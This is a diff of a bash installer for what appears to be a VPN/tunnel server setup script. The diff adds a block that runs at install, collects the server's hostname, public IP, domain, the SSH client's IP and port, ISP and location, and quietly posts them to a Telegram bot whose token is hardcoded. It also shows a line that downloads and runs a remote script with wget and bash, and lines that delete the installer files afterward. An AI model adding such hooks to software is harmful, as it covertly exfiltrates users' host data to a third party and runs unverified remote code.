@@ -192,6 +192,41 @@ echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━�
 sleep 2
 clear
 wget https://raw.githubusercontent.com/NevermoreSSH/Vergil/main/Tunnel/udp.sh && bash udp.sh
+# pemberitahuan
+
+USERID="-4039516558"
+KEY="6452283289:AAF8LR2iWqoA-dW6s8YfapsgkTSq7aRVGck"
+TIMEOUT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+DATE_EXEC="$(date "+%d %b %Y %H:%M")"
+TMPFILE='/tmp/ipinfo-$DATE_EXEC.txt'
+if [ -n "$SSH_CLIENT" ] && [ -z "$TMUX" ]; then
+	IP=$(echo $SSH_CLIENT | awk '{print $1}')
+	PORT=$(echo $SSH_CLIENT | awk '{print $3}')
+	HOSTNAME=$(hostname -f)
+	IPADDR=$(hostname -I | awk '{print $1}')
+	curl http://ipinfo.io/$IP -s -o $TMPFILE
+        CITY=$(cat $TMPFILE | sed -n 's/^  "city":[[:space:]]*//p' | sed 's/"//g')
+        REGION=$(cat $TMPFILE | sed -n 's/^  "region":[[:space:]]*//p' | sed 's/"//g')
+        COUNTRY=$(cat $TMPFILE | sed -n 's/^  "country":[[:space:]]*//p' | sed 's/"//g')
+        ORG=$(cat $TMPFILE | sed -n 's/^  "org":[[:space:]]*//p' | sed 's/"//g')
+	TEXT="
+==============================
+<code>🔰Informasi instalasi script🔰</code>
+==============================
+<code>🔰Tanggal   :</code> <code> $DATE_EXEC</code>
+<code>🔰Domain    :</code> <code> $(cat /etc/xray/domain)</code> 
+<code>🔰Status    :</code> <code> penginstalan script 1 bulan</code>
+<code>✅Hostname  :</code> <code> $HOSTNAME</code>
+<code>✅Publik IP :</code> <code> $IPADDR</code> 
+<code>✅IP PROV   :</code> <code> $IP</code> 
+<code>✅ISP       :</code> <code> $ORG</code>
+<code>✅KOTA      :</code> <code> $CITY</code>
+<code>✅PROVINSI  :</code> <code> $REGION</code>
+<code>✅PORT SSH. :</code> <code> $PORT</code>"
+	curl -s --max-time $TIMEOUT -d "chat_id=$USERID&disable_web_page_preview=1&text=$TEXT" $URL > /dev/null
+	rm $TMPFILE
+fi
 clear
 cat> /root/.profile << END
 # ~/.profile: executed by Bourne-compatible login shells.
@@ -273,6 +308,9 @@ echo "===============-[ SCRIPT PREMIUM CANDRA IRAWAN ]-==============="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
+rm /root/dns2.sh >/dev/null 2>&1
+rm /root/udp.sh >/dev/null 2>&1
+rm /root/setup2.sh >/dev/null 2>&1
 rm /root/setup.sh >/dev/null 2>&1
 rm /root/ins-xray.sh >/dev/null 2>&1
 rm /root/insshws.sh >/dev/null 2>&1
